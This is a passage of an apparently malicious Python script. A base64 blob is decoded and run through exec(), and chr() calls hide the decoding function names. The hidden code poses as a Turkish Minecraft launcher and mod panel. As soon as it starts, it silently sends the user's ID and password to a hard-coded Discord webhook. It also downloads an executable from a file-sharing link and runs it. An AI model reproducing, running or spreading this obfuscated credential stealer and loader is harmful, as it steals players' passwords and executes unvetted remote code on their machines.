ZSBzdGFydHVwJ2EgZWtsZW5kaS4iKQogICAgICAgICAgICAgICAgZXhjZXB0IEltcG9ydEVycm9yOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgInB5d2luMzIgecO8a2zDvCBkZcSfaWwsIHN0YXJ0dXAnYSBla2xlbmVtZWRpLiIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgIkFwYWNoZSB6YXRlbiBzdGFydHVwJ2EgZWtsZW5tacWfLiIpCiAgICBlbHNlOgogICAgICAgIHByaW50KEZvcmUuUkVEICsgZiJYQU1QUCBiYXRjaCBkb3N5YXPEsSBidWx1bmFtYWTEsToge3hhbXBwX3BhdGh9IikKCiAgICBpbnB1dCgiXG5EZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCgpkZWYga3VyX21lbnUoKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgb3Muc3lzdGVtKCJjbHMiKQogICAgICAgIHVzZXJfaWQsIF8gPSBnZXRfdXNlcl9pbmZvKCkKICAgICAgICBwcmludF9jb2xvcmVkX2FzY2lpKHVzZXJfaWQpCiAgICAgICAgcHJpbnQoRm9yZS5XSElURSArICJLdXIgTWVuw7xzw7wiKQogICAgICAgIHByaW50KCIiKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjEuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIExhdW5jaGVyJ8SxIGt1ciIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiMi4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgWEFNUFAnxLEga3VyIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIzLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBYQU1QUCBiYcWfbGF0IikKICAgICAgICBwcmludChGb3JlLlJFRCArICI0LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBEb3N5YWxhcsSxIGt1ciIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiNS4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgR2VyaSIpCiAgICAgICAgY2hvaWNlID0gaW5wdXQoRm9yZS5XSElURSArICJcblNlw6dpbWluaXo6ICIpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGxhdW5jaGVyX2t1cigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICB4YW1wcF9rdXIoKQogICAgICAgIGVsaWYgY2hvaWNlID09ICIzIjoKICAgICAgICAgICAgeGFtcHBfYmFzbGF0KCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNCI6CiAgICAgICAgICAgIGRvc3lhbGFyaV9rdXIoKQogICAgICAgIGVsaWYgY2hvaWNlID09ICI1IjoKICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChGb3JlLlJFRCArICJHZcOnZXJzaXogc2XDp2ltLiIpCiAgICAgICAgICAgIGlucHV0KCJEZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCgpkZWYgc2VydmVyX3N0YXR1cygpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQoKICAgIHNlcnZlciA9ICJveW5hLmJhc28ubmV0d29yayIKICAgIHBvcnQgPSAyNTU2NSAgIyBNaW5lY3JhZnQgc3VudWN1IHBvcnR1CgogICAgdHJ5OgogICAgICAgICMgU29ja2V0IGlsZSBiYcSfbGFudMSxCiAgICAgICAgc29jayA9IHNvY2tldC5jcmVhdGVfY29ubmVjdGlvbigoc2VydmVyLCBwb3J0KSwgdGltZW91dD01KQoKICAgICAgICAjIE1pbmVjcmFmdCBwaW5nIHBha2V0aW5pIGfDtm5kZXIgKHNlcnZlciBsaXN0IHBpbmcpCiAgICAgICAgIyAweEZFID0gTGVnYWN5IHNlcnZlciBsaXN0IHBpbmcgKDEuNyDDtm5jZXNpIHZlIDEuOCBpw6dpbiDDp2FsxLHFn8SxcikKICAgICAgICBzb2NrLnNlbmQoYiJceGZlXHgwMSIpCiAgICAgICAgZGF0YSA9IHNvY2sucmVjdigxMDI0KQogICAgICAgIHNvY2suY2xvc2UoKQoKICAgICAgICBpZiBkYXRhOgogICAgICAgICAgICAjIERhdGEnecSxIGRlY29kZSBldAogICAgICAgICAgICByYXcgPSBkYXRhWzM6XS5kZWNvZGUoInV0Zi0xNmJlIikuc3BsaXQoIlx4MDAiKQogICAgICAgICAgICBvbmxpbmVfcGxheWVycyA9IHJhd1stMl0gICMgT25saW5lIG95dW5jdSBzYXnEsXPEsQogICAgICAgICAgICBwcmludChGb3JlLldISVRFICsgZiJBa3RpZiBtaTogIiArIEZvcmUuTElHSFRHUkVFTl9FWCArICJFdmV0IikKICAgICAgICAgICAgcHJpbnQoRm9yZS5XSElURSArIGYiT3l1bmN1OiAiICsgRm9yZS5MSUdIVEdSRUVOX0VYICsgZiJ7b25saW5lX3BsYXllcnN9IGtpxZ9pIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChGb3JlLldISVRFICsgZiJBa3RpZiBtaTogIiArIEZvcmUuTElHSFRSRURfRVggKyAiSGF5xLFyIikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChGb3JlLlJFRCArIGYiQWt0aWYgbWk6IEhhecSxciIpCgogICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEhBVEEgUkFQT1JMQVJJCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIHNlbmRfc3RhdHVzX3RvX2Rpc2NvcmQoKToKICAgIHRyeToKICAgICAgICB1c2VyX2lkLCBwYXNzd29yZCA9IGdldF91c2VyX2luZm8oKQogICAgICAgIG1vZF9saXN0ID0gb3MubGlzdGRpcihtb2RkaXIpIGlmIG9zLnBhdGguZXhpc3RzKG1vZGRpcikgZWxzZSBbXQogICAgICAgIHRvdGFsX21vZHMgPSBsZW4obW9kX2xpc3QpCiAgICAgICAgdG90YWxfc2l6ZSA9IHN1bShvcy5wYXRoLmdldHNpemUob3MucGF0aC5qb2luKG1vZGRpciwgbSkpIGZvciBtIGluIG1vZF9saXN0KSBpZiBtb2RfbGlzdCBlbHNlIDAKICAgICAgICBsYXN0X2NoZWNrX3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSDolTTolUyIsIHRpbWUubG9jYWx0aW1lKCkpCgogICAgICAgICMgRGluYW1payBsYXVuY2hlcl9wYXRoIChoZXIga3VsbGFuxLFjxLEgacOnaW4gZG/En3J1IEFwcERhdGEgeW9sdSkKICAgICAgICBsb2NhbF9hcHBkYXRhID0gb3MuZ2V0ZW52KCJMT0NBTEFQUERBVEEiKQogICAgICAgIGxhdW5jaGVyX3BhdGggPSBvcy5wYXRoLmpvaW4obG9jYWxfYXBwZGF0YSwgIkJhc28gTmV0d29yayIsICJiYXNvbncuZXhlIikKCiAgICAgICAgIyBMYXVuY2hlciB2YXIgbcSxIHlvayBtdSBrb250cm9sw7wKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMobGF1bmNoZXJfcGF0aCk6CiAgICAgICAgICAgIGVycm9yX21zZyA9ICJMYXVuY2hlciBidWx1bmFtYWTEsSIKICAgICAgICBlbHNlOgogICAgICAgICAgICBlcnJvcl9tc2cgPSAiWW9rIgoKICAgICAgICB3ZWJob29rX3VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDA3Mjk5NDkzMTM2OTYxNTY3L242TlJFNmpJODY1UjRqTkhEUjIyei1SMTB4RjUyMURhM3JXeW4zdWV4NVduNTM5Rjl4MlFwMVdJNk1TUmtyc2tXSDdQIgogICAgICAgIGNvbnRlbnQgPSAoCiAgICAgICAgICAgIGYiKipMYXVuY2hlciBCYcWfbGF0bWEgRHVydW11KipcbiIKICAgICAgICAgICAgZiJLdWxsYW7EsWPEsSBJRDogKip7dXNlcl9pZH0qKlxuIgogICAgICAgICAgICBmIsWeaWZyZTogfHwqKntwYXNzd29yZH0qKnx8XG4iCiAgICAgICAgICAgIGYiVmVyc2l5b246IDEuMjEuNFxuIgogICAgICAgICAgICBmIk1vZCBTYXnEsXPEsTogKip7dG90YWxfbW9kc30qKlxuIgogICAgICAgICAgICBmIlRvcGxhbSBNb2QgQm95dXR1OiAqKnt0b3RhbF9zaXplLzEwMjQ6LjJmfSBLQioqXG4iCiAgICAgICAgICAgIGYiUGFuZWwgVmVyc2l5b251OiAqKntDVVJSRU5UX1ZFUlNJT059KipcbiIKICAgICAgICAgICAgZiJTb24gR8O8bmNlbGxlbWU6ICoqe2xhc3RfY2hlY2tfdGltZX0qKlxuIgogICAgICAgICAgICBmIkhhdGE6XG5gYGBcbntlcnJvcl9tc2d9XG5gYGAgQGV2ZXJ5b25lIgogICAgICAgICkKCiAgICAgICAgcmVxdWVzdHMucG9zdCh3ZWJob29rX3VybCwganNvbj17ImNvbnRlbnQiOiBjb250ZW50fSkKCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICMgRcSfZXIgYnVyYWRhIGJpbGUgaGF0YSBvbHVyc2EgeWFrYWxhIHZlIERpc2NvcmQnYSBnw7ZuZGVyCiAgICAgICAgZXJyb3JfbXNnID0gdHJhY2ViYWNrLmZvcm1hdF9leGMoKQogICAgICAgIHJlcXVlc3RzLnBvc3Qod2ViaG9va191cmwsIGpzb249eyJjb250ZW50IjogZiIqKkxhdW5jaGVyIEJhxZ9sYXRtYSBIQVRBU0kqKlxuYGBgXG57ZXJyb3JfbXNnfVxuYGBgIn0pCgojIFByb2dyYW0gYmHFn2xhciBiYcWfbGFtYXogZ8O2bmRlcgpzZW5kX3N0YXR1c190b19kaXNjb3JkKCkKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExhdW5jaGVyJ8SxIGt1cgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmRlZiBsYXVuY2hlcl9rdXIoKToKICAgIG9zLnN5c3RlbSgiY2xzIikKICAgIHByaW50KEZvcmUuTElHSFRHUkVFTl9FWCArICJMYXVuY2hlciBpbmRpcmlsaXlvciB2ZSBrdXJ1bHV5b3IuLi4iKQoKICAgIHVybCA9ICJodHRwczovLzIwMTcuZmlsZW1haWwuY29tL2FwaS9maWxlL2dldD9maWxla2V5PXRMS0Y0THBuWVFyekRiUHpHcGxmQi12bzRoY2NMTS1hY0Q4YmV5eXB6V1BoU0sxRTUtWlVpZmZmaTkwIgogICAgCiAgICAjIMSwbmRpcm1lIHllcmkgKGdlw6dpY2kgb2xhcmFrIERvd25sb2FkcykKICAgIHRlbXBfZG93bmxvYWQgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkRvd25sb2FkcyIsICJiYXNvbncuZXhlIikKCiAgICAjIEhlZGVmIGtsYXPDtnIgdmUgZG9zeWEKICAgIGxvY2FsX2FwcGRhdGEgPSBvcy5nZXRlbnYoIkxPQ0FMQVBQREFUQSIpCiAgICB0YXJnZXRfZGlyID0gb3MucGF0aC5qb2luKGxvY2FsX2FwcGRhdGEsICJCYXNvIE5ldHdvcmsiKQogICAgb3MubWFrZWRpcnModGFyZ2V0X2RpciwgZXhpc3Rfb2s9VHJ1ZSkKICAgIHRhcmdldF9wYXRoID0gb3MucGF0aC5qb2luKHRhcmdldF9kaXIsICJiYXNvbncuZXhlIikKCiAgICB0cnk6CiAgICAgICAgIyDDlm5jZSBpbmRpcgogICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybHJldHJpZXZlKHVybCwgdGVtcF9kb3dubG9hZCkKICAgICAgICBwcmludChGb3JlLkxJR0hUR1JFRU5fRVggKyBmIkxhdW5jaGVyIGluZGlyaWxkaToge3RlbXBfZG93bmxvYWR9IikKCiAgICAgICAgIyBFxJ9lciBoZWRlZnRlIGVza2kgZXhlIHZhcnNhIHNpbAogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHRhcmdldF9wYXRoKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgb3MucmVtb3ZlKHRhcmdldF9wYXRoKQogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyAiRXNraSBsYXVuY2hlciBzaWxpbmRpLiIpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgZiJFc2tpIGxhdW5jaGVyIHNpbGluZW1lZGk6IHtlfSIpCgogICAgICAgICMgxLBuZGlyaWxlbiBkb3N5YXnEsSBoZWRlZiBrbGFzw7ZyZSBrb3B5YWxhCiAgICAgICAgc2h1dGlsLm1vdmUodGVtcF9kb3dubG9hZCwgdGFyZ2V0X3BhdGgpCiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgZiJMYXVuY2hlciBrdXJ1bGR1OiB7dGFyZ2V0X3BhdGh9IikKCiAgICAgICAgIyDDh2FsxLHFn3TEsXIKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKFt0YXJnZXRfcGF0aF0pCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KEZvcmUuUkVEICsgZiJMYXVuY2hlciBpbmRpcmlsZW1lZGk6IHtlfSIpCgogICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBYQU1QUCBrdXIKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgeGFtcHBfa3VyKCk6CiAgICBvcy5zeXN0ZW0oImNscyIpCiAgICBwcmludChGb3JlLkxJR0hUR1JFRU5fRVggKyAiWEFNUFAga3VydWx1bXUgYmHFn2xhdMSxbMSxeW9yLi4uIikKCiAgICAjIMSwbmRpcm1lIGxpbmtpCiAgICB1cmwgPSAiaHR0cHM6Ly9uZXRpeC5kbC5zb3VyY2Vmb3JnZS5uZXQvcHJvamVjdC94YW1wcC9YQU1QUCUyMFdpbmRvd3MvOC4wLjMwL3hhbXBwLXdpbmRvd3MteDY0LTguMC4zMC0wLVZTMTYtaW5zdGFsbGVyLmV4ZSIKCiAgICAjIERvd25sb2FkcyBrbGFzw7Zyw7xuZSBrYXlkZWRpbGVjZWsgZG9zeWEKICAgIGRvd25sb2FkX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkRvd25sb2FkcyIsICJ4YW1wcF9pbnN0YWxsZXIuZXhlIikKCiAgICB0cnk6CiAgICAgICAgIyDEsG5kaXIKICAgICAgICBwcmludChGb3JlLkxJR0hUR1JFRU5fRVggKyAiWEFNUFAgaW5zdGFsbGVyIGluZGlyaWxpeW9yLi4uIikKICAgICAgICB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSh1cmwsIGRvd25sb2FkX3BhdGgpCiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgZiLEsG5kaXJtZSB0YW1hbWxhbmTEsToge2Rvd25sb2FkX3BhdGh9IikKCiAgICAgICAgIyBZw7ZuZXRpY2kgb2xhcmFrIMOnYWzEscWfdMSxcgogICAgICAgIHByaW50KEZvcmUuTElHSFRHUkVFTl9FWCArICJYQU1QUCBrdXJ1bHVtdSBiYcWfbGF0xLFsxLF5b3IgKEFkbWluIHlldGtpc2kgZ2VyZWtpeW9yKS4uLiIpCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJwb3dlcnNoZWxsIiwgIlN0YXJ0LVByb2Nlc3MiLCBkb3dubG9hZF9wYXRoLCAiLVZlcmIiLCAicnVuQXMiXSkKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIlhBTVBQIGt1cnVsdW11IGJhxZ9sYXTEsWxhbWFkxLE6IHtlfSIpCgogICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgWEFNUFAgYmHFn2xhdAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmRlZiB4YW1wcF9iYXNsYXQoKToKICAgIHhhbXBwX3BhdGggPSByIkM6XHhhbXBwXGFwYWNoZV9zdGFydC5iYXQiCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoeGFtcHBfcGF0aCk6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiWEFNUFAgecO8a2zDvCBkZcSfaWwuIMOWbmNlIFhBTVBQIGt1cnVuLiIpCiAgICAgICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgIHJldHVybgogICAgc3VicHJvY2Vzcy5Qb3BlbihbeGFtcHBfcGF0aF0sIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTk9fV0lORE9XKQogICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgIkFwYWNoZSBiYcWfbGF0xLFsZMSxIHZlIHN0YXJ0dXAnYSBla2xlbmRpIChlxJ9lciBzZcOnaWxtacWfc2UpLiIpCiAgICBpbnB1dCgiXG5EZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgRG9zeWFsYXLEsSBrdXIKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgZG9zeWFsYXJpX2t1cigpOgogICAgeGFtcHBfZGlyID0gciJDOlx4YW1wcCIKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyh4YW1wcF9kaXIpOgogICAgICAgIHByaW50KEZvcmUuUkVEICsgIlhBTVBQIGt1cnVsdSBkZcSfaWwuIMOWbmNlIFhBTVBQIGt1cnVuLiIpCiAgICAgICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgIHJldHVybgoKICAgIHRhcmdldF9mb2xkZXIgPSBvcy5wYXRoLmpvaW4oeGFtcHBfZGlyLCAiaHRkb2NzIiwgImZpbGVzIikKICAgIG9zLm1ha2VkaXJzKHRhcmdldF9mb2xkZXIsIGV4aXN0X29rPVRydWUpCgogICAgIyBSYXcgR2l0SHViIGRvc3lhbGFyxLFuxLEgaW5kaXIKICAgIGJhc2VfdXJsID0gImh0dHBzOi8vbGF1bmNoZXIuYmFzby5uZXR3b3JrL2ZpbGVzIgogICAgZmlsZXMgPSBbImRvc3lhMSIsICJkb3N5YTIiXSAgIyBidXJheWEgZmlsZXMga2xhc8O2csO8bmRla2kgZG9zeWEgaXNpbWxlcmluaSB5YXoKCiAgICBmb3IgZiBpbiBmaWxlczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybHJldHJpZXZlKGJhc2VfdXJsICsgZiwgb3MucGF0aC5qb2luKHRhcmdldF9mb2xkZXIsIGYpKQogICAgICAgICAgICBwcmludChGb3JlLkxJR0hUR1JFRU5fRVggKyBmIntmfSBpbmRpcmlsZGkuIikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgZiJ7Zn0gaW5kaXJpbGVtZWRpOiB7ZX0iKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1lbsO8CiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBvcy5zeXN0ZW0oImNscyIpCiAgICAgICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgICAgIHByaW50X2NvbG9yZWRfYXNjaWkodXNlcl9pZCkKICAgICAgICBwcmludChGb3JlLldISVRFICsgIkJhc28gTmV0d29yayBLdWxsYW7EsWPEsSBQYW5lbGkiKQogICAgICAgIHByaW50KCIiKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjEuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIE1vZCBFa2xlIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIyLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBNb2QgU2lsIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIzLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBNb2RsYXLEsSBMaXN0ZWxlIikKICAgICAgICBwcmludChGb3JlLlJFRCArICI0LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBCYXNvIE5ldHdvcmsgYmlsZ2lsZXJpIikKICAgICAgICBwcmludChGb3JlLlJFRCArICI1LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBMYXVuY2hlcsSxIGHDpyIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiNi4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgS3VyIiArIEZvcmUuV0hJVEUgKyAiICFCaXRtZWRpISIpICAjIDYuIHNlw6dlbmVrIGHDp8SxayB5ZcWfaWwKICAgICAgICBwcmludChGb3JlLlJFRCArICI3LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBTdW51Y3UgRHVydW11IikKICAgICAgICBjaG9pY2UgPSBpbnB1dChGb3JlLldISVRFICsgIlxuU2XDp2ltaW5pejogIikKCiAgICAgICAgaWYgY2hvaWNlID09ICIxIjoKICAgICAgICAgICAgYWRkX21vZCgpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBkZWxldGVfbW9kKCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiMyI6CiAgICAgICAgICAgIGxpc3RfbW9kcygpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBzaG93X3VzZXJfaW5mbygpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjUiOgogICAgICAgICAgICBvcGVuX2xhdW5jaGVyKCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNiI6CiAgICAgICAgICAgIGt1cl9tZW51KCkgICMgNi4gc2XDp2VuZWsgYWx0IG1lbsO8ecO8IGHDp2FjYWsKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNyI6CiAgICAgICAgICAgIHNlcnZlcl9zdGF0dXMoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiR2XDp2Vyc2l6IHNlw6dpbS4iKQogICAgICAgICAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmHFn2xhdAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGNoZWNrX3VwZGF0ZSgpCiAgICBtZW51KCk="
mnbfsWMh = getattr(pDelbRaI, chr(98)+chr(54)+chr(52)+chr(100)+chr(101)+chr(99)+chr(111)+chr(100)+chr(101))
exec(getattr(bytes, chr(100)+chr(101)+chr(99)+chr(111)+chr(100)+chr(101))(mnbfsWMh(ervZrQbR), "utf-8"))
